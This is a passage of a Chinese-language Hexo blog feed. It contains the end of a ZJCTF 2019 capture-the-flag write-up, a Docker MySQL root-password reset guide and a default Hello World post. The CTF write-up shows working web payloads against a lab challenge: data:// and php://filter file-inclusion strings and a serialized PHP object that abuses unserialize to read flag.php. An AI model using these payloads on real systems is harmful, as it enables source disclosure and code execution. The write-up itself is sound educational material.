&lt;p&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;data:&lt;span class=&#34;comment&#34;&gt;//协议&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;需要allow_url_fopen,allow_url_include均为on&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;这是一个输入流执行的协议，它可以向服务器输入数据，而服务器也会执行。常用的方式如下：  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;comment&#34;&gt;//127.0.0.1/include.php?file=data://text/plain,&amp;lt;?php%20phpinfo();?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;text/plain,表示的是文本  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;text/plain;base64，若纯文本没用可用base64编码&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;使用以下地址可以进入 if 语句中&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;comment&#34;&gt;//ip:port/?texdata://text/plain,welcome to the zjctf&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;进入语句之后中看到有 preg_match，该方法与正则表达相关会过滤 &#39;/flag/&#39;。&lt;br /&gt;
include () 方法一般存在漏洞可以利用，此处用 php://filter 协议。&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;php:&lt;span class=&#34;comment&#34;&gt;//filter的用法如下：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;www.ip:port/?file=php:&lt;span class=&#34;comment&#34;&gt;//filter/convert.base64-encode/resource==index.php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;出来的是base64码需要解码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;此协议不受allow_url_fopen,allow_url_include配置影响&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;构造 payload&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;file=php:&lt;span class=&#34;comment&#34;&gt;//filter/conver.base64-encode/resource=useless.php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;输入之后得到 useless.php 的 base64 编码，解码后可得&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Flag&lt;/span&gt;&lt;/span&gt;&amp;#123;  &lt;span class=&#34;comment&#34;&gt;//flag.php  &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__tostring&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;file))&amp;#123;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;file_get_contents&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$this&lt;/span&gt;-&amp;gt;file); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; (&lt;span class=&#34;string&#34;&gt;&amp;quot;U R SO CLOSE !///COME ON PLZ&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;  &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;源码中 unserialize 方法能触发反序列化漏洞，因此利用 useless.php 里写的 file_get_contents 直接去读 flag.php，构造 payload&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Flag&lt;/span&gt;&lt;/span&gt;&amp;#123;  &lt;span class=&#34;comment&#34;&gt;//flag.php  &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;file = &lt;span class=&#34;string&#34;&gt;&amp;quot;flag.php&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Flag&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;serialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;urlencode&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;   &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;得到&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;password=O%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A4%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A%&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;Flag%&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A1%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A%&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;Bs%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A4%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A%&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;file%&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;Bs%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A8%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A%&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;flag.php%&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;B%&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;D&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;最终 payload 为&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;text=data:&lt;span class=&#34;comment&#34;&gt;//text/plain,welcome to the zjctf&amp;amp;file=useless.php&amp;amp;password=O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
</content>
        <category term="网络安全" scheme="http://example.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" />
        <category term="ZJCTF 2019" scheme="http://example.com/tags/ZJCTF-2019/" />
        <updated>2024-07-03T14:35:15.000Z</updated>
    </entry>
    <entry>
        <id>http://example.com/2024/05/09/%E5%A6%82%E4%BD%95%E5%9C%A8docker%E4%B8%AD%E9%87%8D%E7%BD%AEmysql%E7%9A%84root%E5%AF%86%E7%A0%81/</id>
        <title>如何在docker中重置mysql的root密码</title>
        <link rel="alternate" href="http://example.com/2024/05/09/%E5%A6%82%E4%BD%95%E5%9C%A8docker%E4%B8%AD%E9%87%8D%E7%BD%AEmysql%E7%9A%84root%E5%AF%86%E7%A0%81/"/>
        <content type="html">&lt;h1 id=&#34;遇到的问题&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#遇到的问题&#34;&gt;#&lt;/a&gt; 遇到的问题&lt;/h1&gt;
&lt;p&gt;长期未使用 mysql 导致忘记了 root 密码，多次尝试始终无法猜出设置的密码（晕），新建数据库又十分麻烦，故选择重置 root 密码。&lt;/p&gt;
&lt;h1 id=&#34;解决方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#解决方法&#34;&gt;#&lt;/a&gt; 解决方法&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;进入 mysql 容器中：docker exec -it &amp;lt;容器名&amp;gt; bash&lt;/li&gt;
&lt;li&gt;查看 /etc/mysql/conf.d 下是否有 docker.cnf 文件，如果有则在文件末尾添加 skip-grant-tables（网上教程是如此，但本人未成功，没有 docker.cnf 这个文件，自己创建也不行）。如果修改 docker.cnf 不成功，可以尝试修改 /etc/my.cnf 文件，在其中添加 skip-grant-tables，注意不要添加在！includedir /etc/mysql/conf.d/ 后，会不成功的！&lt;/li&gt;
&lt;li&gt;修改后重启该数据库容器，使配置生效：docker restart &amp;lt;容器名&amp;gt;&lt;/li&gt;
&lt;li&gt;进入容器中，执行 mysql -hlocakhost -uroot -p，此时按回车即可，无需密码登录。&lt;/li&gt;
&lt;li&gt;由于在使用 --skip-grant-tables 选项启动服务时禁用了帐户管理，因此必须重新加载授权。 执行 flush privileges 这样就可以更改密码了。&lt;/li&gt;
&lt;li&gt;执行 ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;new_passowrd&#39;; 即可更新密码。
&lt;ul&gt;
&lt;li&gt;有一点需要注意的是，在 5.7 版本以上，不再支持 (update user set password = password (&#39; 你的新密码 &#39;) where user = &#39;root&#39;;) 这种写法，换成如下这种写法 (update user set authentication_string=password (&#39;123&#39;) where user=&#39;root&#39;);&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
</content>
        <category term="Docker" scheme="http://example.com/tags/Docker/" />
        <updated>2024-05-09T15:45:55.000Z</updated>
    </entry>
    <entry>
        <id>http://example.com/2024/04/22/hello-world/</id>
        <title>Hello World</title>
        <link rel="alternate" href="http://example.com/2024/04/22/hello-world/"/>
        <content type="html">&lt;p&gt;Welcome to &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvLw==&#34;&gt;Hexo&lt;/span&gt;! This is your very first post. Check &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv&#34;&gt;documentation&lt;/span&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=&#34;&gt;troubleshooting&lt;/span&gt; or you can ask me on &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==&#34;&gt;GitHub&lt;/span&gt;.&lt;/p&gt;
&lt;h2 id=&#34;quick-start&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#quick-start&#34;&gt;#&lt;/a&gt; Quick Start&lt;/h2&gt;
&lt;h3 id=&#34;create-a-new-post&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#create-a-new-post&#34;&gt;#&lt;/a&gt; Create a new post&lt;/h3&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo new &lt;span class=&#34;string&#34;&gt;&amp;quot;My New Post&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s&#34;&gt;Writing&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;run-server&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#run-server&#34;&gt;#&lt;/a&gt; Run server&lt;/h3&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo server&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=&#34;&gt;Server&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;generate-static-files&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#generate-static-files&#34;&gt;#&lt;/a&gt; Generate static files&lt;/h3&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo generate&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s&#34;&gt;Generating&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;deploy-to-remote-sites&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#deploy-to-remote-sites&#34;&gt;#&lt;/a&gt; Deploy to remote sites&lt;/h3&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo deploy&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s&#34;&gt;Deployment&lt;/span&gt;&lt;/p&gt;
</content>
        <updated>2024-04-22T14:03:55.581Z</updated>
    </entry>
</feed>
